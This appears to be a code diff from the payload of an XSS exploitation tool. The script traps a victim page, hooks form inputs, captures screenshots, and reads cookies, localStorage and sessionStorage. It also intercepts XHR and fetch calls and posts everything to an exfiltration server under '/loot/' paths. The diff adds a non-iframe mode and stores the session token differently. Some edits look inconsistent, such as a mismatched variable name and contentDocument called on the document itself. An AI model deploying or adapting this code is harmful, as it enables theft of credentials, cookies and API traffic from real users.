@@ -73,7 +73,6 @@ function initGlobals()
 	sessionStorage.setItem('taperLastUrl', '');
 
 
-
 	// Slow down the html2canvas
 	window.taperloaded = false;
 
@@ -107,9 +106,14 @@ function initGlobals()
 
 function canAccessIframe(iframe) {
 	try {
+		console.log("Trying to access iframe contentDocument...");
+		var retValue = Boolean(iframe.contentDocument);
+
+		console.log("Return value would be: " + retValue);
 		return Boolean(iframe.contentDocument);
 	}
 	catch(e){
+		console.log("canAccessIframe returning false...");
 		return false;
 	}
 }
@@ -127,7 +131,19 @@ function sendScreenshot()
 	}
 	// console.log("---Snagging screenshot...");
 
-	html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
+	var myReferences = "";
+
+	if (window.taperMode === "trap")
+	{
+		myReference = document.getElementById('iframe_a');
+	}
+	else
+	{
+		myReference = document;
+	}
+
+	// html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
+	html2canvas(myReference.contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
 	{
 		function responseHandler() 
 		{
@@ -138,7 +154,8 @@ function sendScreenshot()
 		// request = new XMLHttpRequest();
 		request = new window.taperXHR();
 		request.addEventListener("load", responseHandler);
-		request.open("POST", taperexfilServer + "/loot/screenshot/" + taperSessionUUID);
+		request.open("POST", taperexfilServer + "/loot/screenshot/" + 
+			sessionStorage.getItem('taperSessionUUID'));
 
 
 		// Helps hide flashing of the page when clicking around
@@ -168,7 +185,19 @@ function sendScreenshot()
 // events multiple times
 function hookInputs()
 {
-	inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
+	var myReference = "";
+
+	if (window.taperMode === "trap")
+	{
+		myReference = document.getElementById("iframe_a");
+	}
+	else
+	{
+		myReference = document;
+	}
+
+	// inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
+	inputs = myReference.contentDocument.getElementsByTagName('input');
 	for (index = 0; index < inputs.length; index++)
 	{
 		// Check to see if we've already hooked the input field. 
@@ -187,7 +216,8 @@ function hookInputs()
 				inputValue = this.value;
 				// request = new XMLHttpRequest();
 				request = new window.taperXHR();
-				request.open("POST", taperexfilServer + "/loot/input/" + taperSessionUUID);
+				request.open("POST", taperexfilServer + "/loot/input/" + 
+						sessionStorage.getItem('taperSessionUUID'));
 				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 				var jsonObj = new Object();
 				jsonObj["inputName"] = inputName;
@@ -251,7 +281,8 @@ function checkCookies()
 		// Ship it
 		// request = new XMLHttpRequest();
 		request = new window.taperXHR();
-		request.open("POST", taperexfilServer + "/loot/dessert/" + taperSessionUUID);
+		request.open("POST", taperexfilServer + "/loot/dessert/" + 
+				sessionStorage.getItem('taperSessionUUID'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["cookieName"] = cookieName;
@@ -303,7 +334,8 @@ function checkLocalStorage()
 		// Ship it
 		// request = new XMLHttpRequest();
 		request = new window.taperXHR();
-		request.open("POST", taperexfilServer + "/loot/localstore/" + taperSessionUUID);
+		request.open("POST", taperexfilServer + "/loot/localstore/" + 
+				sessionStorage.getItem('taperSessionUUID'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -357,7 +389,8 @@ function checkSessionStorage()
 		// Ship it
 		// request = new XMLHttpRequest();
 		request = new window.taperXHR();
-		request.open("POST", taperexfilServer + "/loot/sessionstore/" + taperSessionUUID);
+		request.open("POST", taperexfilServer + "/loot/sessionstore/" + 
+				sessionStorage.getItem('taperSessionUUID'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -372,12 +405,27 @@ function checkSessionStorage()
 // Optional, copy the entire HTML and send out
 function sendHTML()
 {
-	trapURL  = document.getElementById("iframe_a").contentDocument.location.href;
-	trapHTML = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;
+	var myReference = "";
+
+	if (window.taperMode === "trap")
+	{
+		myReference = document.getElementById("iframe_a");
+	}
+	else
+	{
+		myReference = document;
+	}
+
+
+	// trapURL  = document.getElementById("iframe_a").contentDocument.location.href;
+	// trapHTML = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;
+	trapURL  = myReference.contentDocument.location.href;
+	trapHTML = myReference.contentDocument.documentElement.outerHTML;
 
 	// request = new XMLHttpRequest();
 	request = new window.taperXHR();
-	request.open("POST", taperexfilServer + "/loot/html/" + taperSessionUUID);
+	request.open("POST", taperexfilServer + "/loot/html/" + 
+			sessionStorage.getItem('taperSessionUUID'));
 	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 	var jsonObj = new Object();
 	jsonObj["url"] = trapURL;
@@ -420,7 +468,7 @@ function runUpdate()
 	var currentUrl = "";
 	var fullUrl = "";
 
-	if (taperMode === "trap")
+	if (window.taperMode === "trap")
 	{
 		// iFrame trap mode
 		// iFrame trap disable code
@@ -442,7 +490,11 @@ function runUpdate()
 			// Second click will properly load the external page. 
 			// Sad to lose the trap through. 
 			console.log("iFrame access lost, loading page: " + sessionStorage.getItem('taperLastUrl'));
-			window.location = sessionStorage.getItem('taperLastUrl');
+			// window.location = sessionStorage.getItem('taperLastUrl');
+		}
+		else
+		{
+			console.log("Looks like canAccessIframe check passed!");
 		}
 
 		currentUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
@@ -459,7 +511,7 @@ function runUpdate()
 	if (sessionStorage.getItem('taperLastUrl') != currentUrl)
 	{
 		// Handle URL recording
-		console.log("New trap URL, stealing the things: " + fakeUrl);
+		console.log("New trap URL, stealing the things: " + fullUrl);
 		sessionStorage.setItem('taperLastUrl', currentUrl);
 
 
@@ -468,7 +520,8 @@ function runUpdate()
 		// screenshot timing will be right yet
 		// request = new XMLHttpRequest();
 		request = new window.taperXHR();
-		request.open("POST", taperexfilServer + "/loot/location/" + taperSessionUUID);
+		request.open("POST", taperexfilServer + "/loot/location/" + 
+				sessionStorage.getItem('taperSessionUUID'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		
 		var jsonObj = new Object();
@@ -648,7 +701,8 @@ function customFetch(url, options)
 	// send setup loot
 	// request = new XMLHttpRequest();
 	request = new window.taperXHR();
-	request.open("POST", taperexfilServer + "/loot/fetchSetup/" + taperSessionUUID);
+	request.open("POST", taperexfilServer + "/loot/fetchSetup/" + 
+			sessionStorage.getItem('taperSessionUUID'));
 	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 	var jsonObj = new Object();
@@ -665,7 +719,8 @@ function customFetch(url, options)
 		// send header loot
 		// request = new XMLHttpRequest();
 		request = new window.taperXHR();
-		request.open("POST", taperexfilServer + "/loot/fetchHeader/" + taperSessionUUID);
+		request.open("POST", taperexfilServer + "/loot/fetchHeader/" + 
+				sessionStorage.getItem('taperSessionUUID'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 		var jsonObj = new Object();
@@ -691,7 +746,8 @@ function customFetch(url, options)
 			// send API call body loot
 			// request = new XMLHttpRequest();
 			request = new window.taperXHR();
-			request.open("POST", taperexfilServer + "/loot/fetchCall/" + taperSessionUUID);
+			request.open("POST", taperexfilServer + "/loot/fetchCall/" + 
+					sessionStorage.getItem('taperSessionUUID'));
 			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 			var jsonObj = new Object();
@@ -724,9 +780,21 @@ function monkeyPatch()
 	const xhrOriginalSend      = window.XMLHttpRequest.prototype.send;
 
 
+	var myReference = "";
+
+	if (window.taperMode === "trap")
+	{
+		myReference = document.getElementById("iframe_a");
+	}
+	else
+	{
+		myReference = document;
+	}
+
 
 	//Monkey patch open
-	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
+	// document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
+	myReference.contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
 	{
 		var method = arguments[0];
 		var url = arguments[1];
@@ -737,7 +805,8 @@ function monkeyPatch()
 		// send loot
 		// request = new XMLHttpRequest();
 		request = new window.taperXHR();
-		request.open("POST", taperexfilServer + "/loot/xhrOpen/" + taperSessionUUID);
+		request.open("POST", taperexfilServer + "/loot/xhrOpen/" + 
+				sessionStorage.getItem('taperSessionUUID'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 		var jsonObj = new Object();
@@ -753,7 +822,8 @@ function monkeyPatch()
 
 
 	// Monkey patch setRequestHeader
-	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.setRequestHeader = function (header, value)
+	// document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.setRequestHeader = function (header, value)
+	myReference.contentWindow.XMLHttpRequest.prototype.setRequestHeader = function (header, value)
 	{
 		var header = arguments[0];
 		var value  = arguments[1];
@@ -765,7 +835,8 @@ function monkeyPatch()
 
 		// request = new XMLHttpRequest();
 		request = new window.taperXHR();
-		request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + taperSessionUUID);
+		request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + 
+				sessionStorage.getItem('taperSessionUUID'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 		var jsonObj = new Object();
@@ -780,7 +851,8 @@ function monkeyPatch()
 
 
   	// Monkey patch send
-	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) 
+	// document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) 
+	myReference.contentWindow.XMLHttpRequest.prototype.send = function(data) 
 	{
 		console.log("Intercepted request body: " + data);
 
@@ -816,7 +888,8 @@ function monkeyPatch()
 
 				// request = new XMLHttpRequest();
 				request = new window.taperXHR();
-				request.open("POST", taperexfilServer + "/loot/xhrCall/" + taperSessionUUID);
+				request.open("POST", taperexfilServer + "/loot/xhrCall/" + 
+						sessionStorage.getItem('taperSessionUUID'));
 				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 				var jsonObj = new Object();
@@ -834,7 +907,8 @@ function monkeyPatch()
 	// console.log("## Starting fetch monkey patching");
 	// Fetch API monkey patching
 	const originalFetch = window.fetch;
-	document.getElementById("iframe_a").contentWindow.fetch = customFetch;
+	// document.getElementById("iframe_a").contentWindow.fetch = customFetch;
+	myReference.contentWindow.fetch = customFetch;
 }
 
 
@@ -1008,7 +1082,9 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 
 
 				var jsonResponse = JSON.parse(request.responseText);
-				window.taperSessionUUID = jsonResponse.clientToken;
+				//window.taperSessionUUID = jsonResponse.clientToken;
+				sessionStorage.setItem('taperSessionUUID', jsonResponse.clientToken);
+
 
     			// We're ready to trap all the things now
 				takeOver();
